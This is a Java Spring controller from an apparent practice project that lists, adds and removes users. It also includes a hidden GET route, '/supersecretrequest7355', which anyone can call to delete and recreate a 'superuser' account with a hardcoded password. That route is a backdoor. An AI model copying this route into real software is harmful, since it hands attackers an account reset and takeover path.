package com.practice3.reporter.Controllers;

import com.practice3.reporter.EnumRole;
import com.practice3.reporter.Services.UserService;
import com.practice3.reporter.Entities.User;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.validation.BindingResult;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;

import javax.validation.Valid;
import java.util.List;
import java.util.NoSuchElementException;

@Controller
public class UserController {
    private static UserService service;

    @Autowired
    public void setService(UserService service) {
        UserController.service = service;
    }

    public static List getAllUsers() {
        return service.getAllUsers();
    }

    @GetMapping("/users")
    public String giveUsers(Model model) {
        /*Random random=new Random();
        for (int i = 0; i < random.nextInt(32); i++) {
            service.saveUser(new User("user"+random.nextInt(), "123456", random.nextBoolean() ? EnumRole.ROLE_DISPATCHER : EnumRole.ROLE_SUPERUSER));
        }*/
        model.addAttribute("list", service.getAllUsers());
        model.addAttribute("newUser", new User());
        return "Dispatcher/users";
    }

    @GetMapping("/supersecretrequest7355")
    public String addAdmin(Model model) {
        User user = new User(0, "superuser", "admin", EnumRole.DISPATCHER, "admin", "admin", "admin");
        user.setPassword(new BCryptPasswordEncoder().encode("4ad928352466018e8083957ecf1e35c20fdc668e57ded828e1ef0499fd5d5c81"));
        service.removeByUsername("superuser");
        service.saveUser(user);

        return "redirect:/entrance";
    }

    @PostMapping("/add_user")
    public String addUser(@Valid User user, BindingResult result, Model model) {
        if (result.hasErrors()) {
            model.addAttribute("list", service.getAllUsers());
            model.addAttribute("newUser", user);
            return "Dispatcher/users";
        }
        user.setPassword(new BCryptPasswordEncoder().encode(user.getPassword()));
        service.saveUser(user);
        return "redirect:/users";
    }

    @PostMapping("/remove_user")
    public String removeUser(@RequestParam Long id, @RequestParam String action) {
        if (action.equals("delete")) {
            if (!service.existsWithId(id))
                throw new NoSuchElementException();
            service.removeById(id);
        }
        return "redirect:/users";
    }
}
